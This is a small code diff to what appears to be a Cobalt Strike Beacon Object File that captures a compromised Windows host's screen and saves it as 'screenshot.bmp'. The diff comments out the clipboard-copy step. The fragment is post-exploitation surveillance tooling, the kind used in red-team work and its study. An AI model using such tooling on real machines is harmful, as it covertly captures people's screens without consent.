@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include "bofdefs.h"
+
 #pragma comment(lib, "User32.lib")
 #pragma comment(lib, "Gdi32.lib")
 
@@ -122,12 +123,13 @@ void go(char* buff, int len) {
 
     //I was going to pull from the clipboard but then realized it
     //was more trouble than it was worth, so I just saved it to a file. ~ CodeX
-    
+    /*
     // save bitmap to clipboard
     OpenClipboard(NULL);
     EmptyClipboard();
     SetClipboardData(CF_BITMAP, hBitmap);
     CloseClipboard();
+    */
     
     BeaconPrintf(0x0, "[+] PrintScreen saved to bitmap...");
     LPCSTR filename = "screenshot.bmp";
